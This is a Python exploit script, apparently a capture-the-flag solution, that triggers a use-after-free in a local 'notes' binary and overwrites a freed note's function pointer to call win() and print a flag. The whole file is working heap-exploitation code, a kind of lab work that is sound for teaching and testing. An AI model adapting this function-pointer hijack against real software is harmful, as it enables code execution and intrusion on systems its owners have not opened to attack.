#!/usr/bin/env python3
import subprocess
import struct
import sys

WIN_ADDR = 0x4012c7  # from: objdump -d notes | grep -A1 '<win>:'

def build_payload():
    buf = b""
    # 1) Add note 0
    buf += b"1\n"
    buf += b"AAAA\n"
    # 2) Delete note 0 -> frees content(64) then struct(16); notes[0] left dangling
    buf += b"2\n"
    buf += b"0\n"
    # 3) Add raw tag -> malloc(16) reuses the just-freed note_t chunk.
    #    Lay down: [0:8] = fake content ptr, [8:16] = fake print_func = win()
    fake_content_ptr = b"\x00" * 8  # unused by win(), can be garbage/null
    fake_print_func = struct.pack("<Q", WIN_ADDR)
    buf += b"5\n"
    buf += fake_content_ptr + fake_print_func
    # 4) View note 0 -> notes[0]->print_func(notes[0]) now calls win()
    buf += b"3\n"
    buf += b"0\n"
    # 5) Exit cleanly
    buf += b"4\n"
    return buf

def main():
    payload = build_payload()
    proc = subprocess.run(
        ["./notes"],
        input=payload,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=5,
    )
    out = proc.stdout.decode(errors="replace")
    print("----- program output -----")
    print(out)
    print("----- return code -----", proc.returncode)
    if "bugbounty{" in out:
        print("\n[+] EXPLOIT CONFIRMED: flag printed via hijacked print_func -> win()")
        sys.exit(0)
    else:
        print("\n[-] Exploit did not trigger win(). Needs debugging.")
        sys.exit(1)

if __name__ == "__main__":
    main()
